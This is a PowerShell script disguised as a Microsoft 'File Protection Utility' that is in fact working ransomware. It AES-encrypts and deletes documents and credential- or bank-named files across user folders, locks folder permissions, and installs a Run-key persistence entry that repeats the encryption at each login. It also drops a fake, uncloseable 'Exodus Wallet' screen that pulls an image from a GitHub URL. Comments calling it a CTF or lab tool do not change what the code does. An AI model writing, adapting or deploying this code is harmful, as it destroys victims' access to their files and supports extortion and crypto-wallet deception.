# Microsoft Windows File Protection Utility - Secure File Management for Windows (Modes: Full/Select)
# Usage: .\WindowsCeasar.ps1 -ProtectFull -Key <password> or -RestoreFull -Key <password> or -ProtectSelect <path> -Key <password> or -RestoreSelect <path> -Key <password>
# Auto-Update: -EnableAutoUpdate -Key <password> (installs as User-Level Registry-Run-Key, calls Full with Key)
# Payload Drop: Automatically drops a persistence payload during ProtectFull mode for enhanced simulation in controlled environments (e.g., CTF/Pentest labs)
# Utilizes AES-CBC with PKCS7-Padding for secure file handling, with specific error handling for integrity checks (incorrect Key).
param (
    [switch]$ProtectFull,
    [switch]$RestoreFull,
    [string]$ProtectSelect,
    [string]$RestoreSelect,
    [switch]$EnableAutoUpdate,
    [string]$Key = "test" # Default for compatibility, but recommended: Always specify a unique Key
)
if ($Key -eq "test") {
    Write-Output "Warning: Default Key 'test' in use - For optimal security, provide a unique Key!"
}
$FullPaths = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads",
    "$env:USERPROFILE\AppData\Roaming",
    "C:\Users\Public\Documents"
) # Standard user directories for Full mode
$FilePatternsProtect = @("*.txt", "*.doc", "*.docx", "*.xls", "*.xlsx", "*.pdf", "*password*", "*pass*", "*flag*", "*ctf*", "*credit*", "*bank*", "*customer*", "*kunden*")
$FilePatternsRestore = @("*.enc") # For restoration, search for .enc files
$ExcludeExtensions = @(".lnk", ".sys", ".dll", ".exe", ".ps1") # Exclusions for system files
# Function: Generate Key from Password (AES-256, PBKDF2 with random Salt)
function Get-AesKey {
    param ([string]$Pass, [byte[]]$Salt = $null)
    if ($null -eq $Salt) {
        $rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::new()
        $Salt = New-Object byte[] 16
        $rng.GetBytes($Salt)
    }
    $KeyDerive = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($Pass, $Salt, 100000) # Increased iterations
    $Key = $KeyDerive.GetBytes(32)
    return $Key, $Salt # Return Key and Salt (Salt is prepended)
}
# Function: Protect File (AES-CBC with PKCS7-Padding)
function Protect-File {
    param ([string]$FilePath, [string]$Pass)
    try {
        $FilePath = (Resolve-Path $FilePath -ErrorAction Stop).Path # Always use absolute path
        $Key, $Salt = Get-AesKey $Pass
        $Aes = [System.Security.Cryptography.Aes]::Create()
        $Aes.Key = $Key
        $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $rng = [System.Security.Cryptography.RNGCryptoServiceProvider]::new()
        $IV = New-Object byte[] 16
        $rng.GetBytes($IV)
        $Aes.IV = $IV
        $Protector = $Aes.CreateEncryptor()
        $FileStream = [System.IO.File]::OpenRead($FilePath)
        $MemoryStream = New-Object System.IO.MemoryStream
        $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream, $Protector, [System.Security.Cryptography.CryptoStreamMode]::Write)
        $FileStream.CopyTo($CryptoStream)
        $CryptoStream.FlushFinalBlock()
        $ProtectedBytes = $MemoryStream.ToArray()
        if ($ProtectedBytes.Length % 16 -ne 0) {
            throw "Internal Error: Protected content has invalid length ($($ProtectedBytes.Length) Bytes) - should be multiple of 16."
        }
        $ProtectedData = $Salt + $IV + $ProtectedBytes # Prepend Salt + IV
        $ProtPath = "$FilePath.enc"
        [System.IO.File]::WriteAllBytes($ProtPath, $ProtectedData)
        $FileStream.Close()
        $CryptoStream.Close()
        $MemoryStream.Close()
        Remove-Item $FilePath
        Write-Output "Protected: $FilePath -> $ProtPath (Original Size: $($FileStream.Length) Bytes, Protected: $($ProtectedBytes.Length) Bytes, Total: $($ProtectedData.Length) Bytes)"
    } catch {
        Write-Output "Error protecting ${FilePath}: $_"
    }
}
# Function: Restore File (AES-CBC with PKCS7-Padding, with Integrity Check Handling)
function Restore-File {
    param ([string]$FilePath, [string]$Pass)
    try {
        $FilePath = (Resolve-Path $FilePath -ErrorAction Stop).Path # Always use absolute path
        if ($FilePath -notlike "*.enc") { return }
        $ProtectedData = [System.IO.File]::ReadAllBytes($FilePath)
        Write-Verbose "Total size of enc file: $($ProtectedData.Length) Bytes"
        if ($ProtectedData.Length -lt 32) {
            throw "The protected file is too small (less than 32 Bytes). It may not be properly protected or corrupt."
        }
        $Salt = $ProtectedData[0..15]
        $IV = $ProtectedData[16..31]
        $CipherText = $ProtectedData[32..($ProtectedData.Length - 1)]
        Write-Verbose "Ciphertext Size: $($CipherText.Length) Bytes"
        if ($CipherText.Length % 16 -ne 0) {
            throw "Corrupt protected file: Ciphertext length ($($CipherText.Length) Bytes) is not a multiple of 16 Bytes."
        }
        $Key, $null = Get-AesKey $Pass $Salt
        $Aes = [System.Security.Cryptography.Aes]::Create()
        $Aes.Key = $Key
        $Aes.IV = $IV
        $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $Restorer = $Aes.CreateDecryptor()
        $MemoryStream = New-Object System.IO.MemoryStream($CipherText, 0, $CipherText.Length)
        $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream, $Restorer, [System.Security.Cryptography.CryptoStreamMode]::Read)
        $RestoredStream = New-Object System.IO.MemoryStream
        $CryptoStream.CopyTo($RestoredStream)
        $RestoredBytes = $RestoredStream.ToArray()
        $OriginalPath = $FilePath -replace ".enc$", ""
        [System.IO.File]::WriteAllBytes($OriginalPath, $RestoredBytes)
        $CryptoStream.Close()
        $MemoryStream.Close()
        $RestoredStream.Close()
        Remove-Item $FilePath
        Write-Output "Restored: $OriginalPath (Restored Size: $($RestoredBytes.Length) Bytes)"
    } catch [System.Security.Cryptography.CryptographicException] {
        if ($_.Exception.Message -like "*Padding*") {
            Write-Output "Error restoring ${FilePath}: Incorrect Key (Integrity check failed)."
        } else {
            Write-Output "Error restoring ${FilePath}: $_ (Incorrect Key or corrupt file?)"
        }
    } catch {
        Write-Output "Error restoring ${FilePath}: $_ (Incorrect Key or corrupt file?)"
    }
}
# Function: Set Folder Permissions (Deny Read for Users Group (SID), Grant Full for current User)
function Secure-Folder {
    param ([string]$Path, [switch]$Secure)
    try {
        $Path = (Resolve-Path $Path -ErrorAction Stop).Path # Absolute path
        $acl = Get-Acl $Path
        if ($Secure) {
            # Deny Read for Users Group (SID S-1-5-32-545, language-independent)
            $denyRule = New-Object System.Security.AccessControl.FileSystemAccessRule("S-1-5-32-545", "Read", "ContainerInherit,ObjectInherit", "None", "Deny")
            $acl.AddAccessRule($denyRule)
            # Grant Full for current User
            $grantRule = New-Object System.Security.AccessControl.FileSystemAccessRule($env:USERNAME, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
            $acl.AddAccessRule($grantRule)
            # Remove Inheritance
            $acl.SetAccessRuleProtection($true, $false)
        } else {
            # Reset to inherited
            $acl.SetAccessRuleProtection($false, $true)
        }
        Set-Acl -Path $Path -AclObject $acl
        Write-Output "Folder secured/reset: $Path"
    } catch {
        Write-Output "Error setting permissions for ${Path}: $_ (Insufficient user rights? Ignoring for utility purposes.)"
    }
}
# Function: Scan and Process Directory (recursive)
function Process-Path {
    param ([string]$Path, [switch]$IsProtect, [string]$Pass)
    $Path = (Resolve-Path $Path -ErrorAction Stop).Path # Absolute path
    if (Test-Path $Path) {
        $patterns = if ($IsProtect) { $FilePatternsProtect } else { $FilePatternsRestore }
        $files = Get-ChildItem -Path $Path -Recurse -Include $patterns -File | Where-Object { $_.Extension -notin $ExcludeExtensions }
        foreach ($file in $files) {
            if ($IsProtect) {
                if ($file.FullName -notlike "*.enc") { Protect-File $file.FullName $Pass }
            } else {
                Restore-File $file.FullName $Pass
            }
        }
        # Recursively set permissions on subdirectories
        Get-ChildItem -Path $Path -Recurse -Directory | ForEach-Object {
            Secure-Folder -Path $_.FullName -Secure:$IsProtect
        }
        Secure-Folder -Path $Path -Secure:$IsProtect
    } else {
        Write-Output "Path not found: $Path"
    }
}
# New Function: Drop Persistence Payload (Creates directory and writes GUI script for simulation/persistence in CTF/lab environments)
function Drop-Payload {
    param ([string]$TargetUser = "adsfa")  # Hardcoded for challenge environment; adjust as needed
    $targetDir = "C:\Users\$TargetUser\AppData\Roaming\Microsoft\Windows\PowerShell\operations"
    try {
        if (!(Test-Path $targetDir)) {
            New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
            Write-Output "Created payload directory: $targetDir"
        }
        $payloadScript = @'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()
# TLS 1.2 für GitHub
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
} catch {}
# ==================== HAUPTFENSTER ====================
$form = New-Object System.Windows.Forms.Form
$form.Text = "Exodus WALLET"
$form.StartPosition = "CenterScreen"
$form.Size = New-Object System.Drawing.Size(1200, 720)
$form.FormBorderStyle = "None"
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.ControlBox = $false
$form.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$form.ForeColor = [System.Drawing.Color]::White
$form.Cursor = [System.Windows.Forms.Cursors]::WaitCursor
$form.TopMost = $true
# ==================== GRADIENT-HEADER: EXODUS (OBEN) ====================
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Dock = "Top"
$headerPanel.Height = 90
$headerPanel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$headerPanel.Add_Paint({
    param($sender, $e)
    $g = $e.Graphics
    $g.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::AntiAlias
    $text = "EXODUS CRYPTO WALLET"
    $font = New-Object System.Drawing.Font(
        "Segoe UI",
        44,
        [System.Drawing.FontStyle]::Bold
    )
    $sizeF = $g.MeasureString($text, $font)
    $x = ($sender.ClientSize.Width - $sizeF.Width) / 2
    $y = ($sender.ClientSize.Height - $sizeF.Height) / 2
    $rect = New-Object System.Drawing.RectangleF($x, $y, $sizeF.Width, $sizeF.Height)
    $colorStart = [System.Drawing.ColorTranslator]::FromHtml("#00E5FF") # Neonblau
    $colorEnd = [System.Drawing.ColorTranslator]::FromHtml("#7C3AED") # Violett
    $brush = New-Object System.Drawing.Drawing2D.LinearGradientBrush(
        $rect,
        $colorStart,
        $colorEnd,
        [System.Drawing.Drawing2D.LinearGradientMode]::Horizontal
    )
    $g.DrawString($text, $font, $brush, $rect.Location)
    $brush.Dispose()
    $font.Dispose()
})
$form.Controls.Add($headerPanel)
# ==================== GIF (OBEN, volle Breite, unter EXODUS) ====================
$gifUrl = "https://raw.githubusercontent.com/KunisCode/23sdafuebvauejsdfbatzg23rS/main/loading.gif"
$gifPath = Join-Path $env:TEMP "exodus_loading.gif"
try { (New-Object System.Net.WebClient).DownloadFile($gifUrl, $gifPath) } catch {}
$pictureBox = New-Object System.Windows.Forms.PictureBox
$pictureBox.Dock = "Top"
$pictureBox.Height = 400
$pictureBox.SizeMode = "Zoom"
$pictureBox.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
if (Test-Path $gifPath) {
    $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath)
}
$form.Controls.Add($pictureBox)
# ==================== HEADER: AUTHENTICATION (MITTE OBEN) ====================
$loadingLabel = New-Object System.Windows.Forms.Label
$loadingLabel.Font = New-Object System.Drawing.Font(
    "Segoe UI",
    30,
    [System.Drawing.FontStyle]::Bold
)
$loadingLabel.ForeColor = "White"
$loadingLabel.Dock = "Top"
$loadingLabel.Height = 80
$loadingLabel.TextAlign = "MiddleCenter"
$loadingLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
$form.Controls.Add($loadingLabel)
# ===================== MODERNE FORTSCHRITTSBALKEN UNTEN =====================
$progressBg = New-Object System.Windows.Forms.Panel
$progressBg.Dock = "Bottom"
$progressBg.Height = 14
$progressBg.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 50)
$progressBar = New-Object System.Windows.Forms.Panel
$progressBar.Height = 14
$progressBar.Width = 0
$progressBar.BackColor = [System.Drawing.Color]::FromArgb(139,92,246)
$progressBg.Controls.Add($progressBar)
$progressBg2 = New-Object System.Windows.Forms.Panel
$progressBg2.Dock = "Bottom"
$progressBg2.Height = 6
$progressBg2.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 40)
$progressBar2 = New-Object System.Windows.Forms.Panel
$progressBar2.Height = 6
$progressBar2.Width = 50
$progressBar2.BackColor = [System.Drawing.Color]::FromArgb(180,140,255)
$progressBg2.Controls.Add($progressBar2)
# ==================== STATUSLABEL UNTEN ÜBER DEN LADEBALKEN ====================
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 14)
$statusLabel.ForeColor = "#CCCCCC"
$statusLabel.Dock = "Bottom"
$statusLabel.Height = 40
$statusLabel.TextAlign = "MiddleCenter"
$statusLabel.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#0F0E1E")
# Docking-Reihenfolge für unten: von unten nach oben
$form.Controls.Add($progressBg2)
$form.Controls.Add($progressBg)
$form.Controls.Add($statusLabel)
# ===================== TIMER SETUP =====================
$marqueePos = 0
$percent = 0
$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 50
$labelTimer = New-Object System.Windows.Forms.Timer
$labelTimer.Interval = 3000
# ===================== STATUS PHASEN =====================
$authPhaseDuration = 15000 # 15 Sekunden
$inAuthPhase = $true
$authStartTime = Get-Date
# Anfangstexte beim Start
$loadingLabel.Text = "Authenticating device..."
$statusLabel.Text = "Performing background security checks..."
$statuses = @(
    "Loading wallet...",
    "Connecting to secure servers...",
    "Decrypting local data...",
    "Fetching asset metadata...",
    "Syncing blockchain nodes...",
    "Preparing secure environment...",
    "Loading portfolio assets...",
    "Almost there..."
)
$statusIndex = 0
$dotCount = 0
# ===================== Fortschritt / Balken Animation =====================
$timer.Add_Tick({
    try {
        if ($form.IsDisposed) { $timer.Stop(); return }
        # Wenn die Authentifizierungsphase vorbei ist -> Wechsel der Texte & Animation aktivieren
        if ($inAuthPhase -and ((Get-Date) - $authStartTime).TotalMilliseconds -gt $authPhaseDuration) {
            $inAuthPhase = $false
            $loadingLabel.Text = "Loading wallet"
            $statusLabel.Text = $statuses[0]
        }
        # Marquee immer animieren
        $marqueePos += 5
        if ($marqueePos -gt $progressBg2.Width) { $marqueePos = -50 }
        $progressBar2.Left = $marqueePos
        # In der Auth-Phase keine Prozentanzeige
        if ($inAuthPhase) { return }
        # Prozentbalken füllen
        if ($percent -lt 100) {
            $percent += 0.3
            $progressBar.Width = [int]($progressBg.Width * ($percent / 100.0))
        }
    } catch {
    }
})
# ===================== TEXT-ANIMATION =====================
$labelTimer.Add_Tick({
    try {
        if ($form.IsDisposed) { $labelTimer.Stop(); return }
        # Während Auth-Phase keine Punktanimation, kein Statuswechsel
        if ($inAuthPhase) { return }
        $dotCount = ($dotCount + 1) % 4
        $loadingLabel.Text = "Loading wallet" + ("." * $dotCount)
        $statusIndex = ($statusIndex + 1) % $statuses.Count
        $statusLabel.Text = $statuses[$statusIndex]
    } catch {
    }
})
# ===================== CLEANUP =====================
$form.Add_FormClosing({
    $timer.Stop()
    $labelTimer.Stop()
})
$timer.Start()
$labelTimer.Start()
$form.Add_Shown({ $form.Activate() })
$form.ShowDialog() | Out-Null
'@
        $payloadPath = Join-Path $targetDir "exodus.ps1"
        $payloadScript | Out-File -FilePath $payloadPath -Encoding UTF8 -Force
        Write-Output "Payload dropped: $payloadPath (For lab/CTF persistence simulation)"
    } catch {
        Write-Output "Error dropping payload to $targetDir`: $_"
    }
}
# Auto-Update: Install as User-Level Registry-Run-Key (calls Full mode with Key)
if ($EnableAutoUpdate) {
    $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $TaskName = "MicrosoftFileProtector"
    $ScriptPath = $PSScriptRoot + "\WindowsCeasar.ps1"
    $Value = "powershell.exe -ExecutionPolicy Bypass -Command `"& { Start-Sleep -Seconds 60; . $ScriptPath -ProtectFull -Key '$Key' }`""
    Set-ItemProperty -Path $RegPath -Name $TaskName -Value $Value
    Write-Output "Auto-Update enabled: Registry Key '$TaskName' runs at login (User-Level, Full mode with Key '$Key')."
    exit
}
# Main Logic (Pass Key to Process-Path)
if ($ProtectFull) {
    foreach ($path in $FullPaths) { Process-Path -Path $path -IsProtect -Pass $Key }
    # Automatically drop payload after full protection (for CTF/lab enhancement)
    Drop-Payload
} elseif ($RestoreFull) {
    foreach ($path in $FullPaths) { Process-Path -Path $path -Pass $Key }
} elseif ($ProtectSelect) {
    Process-Path -Path $ProtectSelect -IsProtect -Pass $Key
} elseif ($RestoreSelect) {
    Process-Path -Path $RestoreSelect -Pass $Key
} else {
    Write-Output "Usage: -ProtectFull -Key <pass> or -RestoreFull -Key <pass> or -ProtectSelect <path> -Key <pass> or -RestoreSelect <path> -Key <pass> or -EnableAutoUpdate -Key <pass>."
}
